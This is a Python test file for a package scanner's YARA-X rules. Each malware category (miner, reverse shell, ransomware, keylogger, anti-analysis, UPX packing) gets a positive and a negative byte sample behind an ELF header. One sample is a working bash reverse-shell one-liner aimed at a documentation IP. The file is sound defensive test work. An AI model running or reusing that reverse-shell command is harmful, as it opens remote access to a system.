"""S4-10: own YARA-X rules for program files. Every rule has a positive and a negative sample;
the samples are a few bytes with an ELF header and the indicator strings, nothing executable.
Rule tests run with the real ``yr`` (LUIBUI_YARA or on PATH) and are skipped without it."""

import os
import shutil
import sys
from pathlib import Path

import pytest

from luibui_scan.analyzers.a_yara import YaraAnalyzer
from luibui_scan.context import ScanContext
from luibui_scan.inventory import build_inventory
from luibui_scan.models import Pruefumfang, ScanArt, Schwere
from luibui_scan.scoring import is_blocklisted
from luibui_scan.tools import ToolError, yara

REPO = Path(__file__).resolve().parents[3]
RULES = REPO / "rules"
YR = os.environ.get("LUIBUI_YARA") or shutil.which("yr")
needs_yr = pytest.mark.skipif(not YR, reason="YARA-X (yr) nicht installiert (LUIBUI_YARA setzen)")
ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8

FAELLE: dict[str, tuple[bytes, bytes]] = {
    # rule: (positive, negative) - the negative is close to the positive on purpose
    "LB-C10-krypto-miner": (b"stratum+tcp://pool.invalid:3333", b"xmrig alone is a name only"),
    "LB-C10-reverse-shell": (b"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1", b"/dev/tcp/ only"),
    "LB-C10-ransomware": (
        b"All your files have been encrypted. Pay in bitcoin.",
        b"bitcoin wallet",
    ),
    "LB-C10-keylogger": (b"SetWindowsHookExW\x00GetAsyncKeyState", b"GetAsyncKeyState\x00"),
    "LB-C10-anti-analyse": (
        b"IsDebuggerPresent\x00CheckRemoteDebuggerPresent\x00VBoxService",
        b"IsDebuggerPresent\x00VBoxService",
    ),
    "LB-A04-gepackt": (b"UPX0\x00UPX1\x00UPX!", b"UPX! but no sections"),
}


def ctx_for(tmp_path: Path, files: dict[str, bytes]) -> ScanContext:
    root = tmp_path / "pkg"
    for rel, data in files.items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_bytes(data)
    return ScanContext(
        root=root,
        scan_art=ScanArt.INTENSIV,
        pruefumfang=Pruefumfang.AUSWAHL,
        inventory=build_inventory(root).entries,
    )


@needs_yr
@pytest.mark.parametrize("regel", sorted(FAELLE))
def test_every_rule_has_a_positive_and_a_negative_sample(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, regel: str
) -> None:
    monkeypatch.setenv("LUIBUI_YARA", str(YR))
    positiv, negativ = FAELLE[regel]
    ctx = ctx_for(tmp_path, {"ja.bin": ELF + positiv, "nein.bin": ELF + negativ})
    treffer = {(f.rule_id, f.datei) for f in YaraAnalyzer().analyze(ctx)}
    assert (regel, "ja.bin") in treffer
    assert (regel, "nein.bin") not in treffer


@needs_yr
def test_all_rules_have_samples_and_metadata(tmp_path: Path) -> None:
    text = (RULES / "yara" / "luibui.yar").read_text()
    regeln = {z.split('"')[1] for z in text.splitlines() if z.strip().startswith("regel =")}
    assert regeln == set(FAELLE)
    assert text.count("schwere =") == text.count("titel =") == len(FAELLE)


@needs_yr
def test_miner_blocks_and_text_files_are_not_scanned(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("LUIBUI_YARA", str(YR))
    miner = b"stratum+tcp://pool.invalid:3333"
    ctx = ctx_for(tmp_path, {"lib/miner.so": ELF + miner, "README.md": b"# Doku\n" + miner})
    [f] = YaraAnalyzer().analyze(ctx)
    assert (f.datei, f.schwere) == ("lib/miner.so", Schwere.K) and is_blocklisted(f)


def test_without_binaries_yr_is_not_needed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("LUIBUI_YARA", raising=False)
    monkeypatch.setattr(shutil, "which", lambda _: None)
    assert YaraAnalyzer().analyze(ctx_for(tmp_path, {"SKILL.md": b"# x\n"})) == []
    with pytest.raises(ToolError):
        YaraAnalyzer().analyze(ctx_for(tmp_path / "b", {"a.bin": ELF}))


def _fake_yr(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, code: str) -> None:
    skript = tmp_path / "yr"
    skript.write_text(f"#!{sys.executable}\n{code}\n")
    skript.chmod(0o755)
    monkeypatch.setenv("LUIBUI_YARA", str(skript))


@pytest.mark.parametrize("code", ["import sys; sys.exit(1)", "print('kein json')", "print('[]')"])
def test_adapter_errors_become_tool_errors(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, code: str
) -> None:
    _fake_yr(tmp_path, monkeypatch, code)
    with pytest.raises(ToolError):
        YaraAnalyzer().analyze(ctx_for(tmp_path, {"a.bin": ELF}))


def test_paths_outside_the_package_are_dropped(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _fake_yr(
        tmp_path,
        monkeypatch,
        "import json; print(json.dumps({'matches': [{'rule': 'x', 'file': '/etc/passwd', "
        "'meta': {'regel': 'LB-C10-reverse-shell', 'schwere': 'K', 'titel': 't'}}]}))",
    )
    assert yara.scan(tmp_path / "pkg", ["a.bin"], RULES) == []
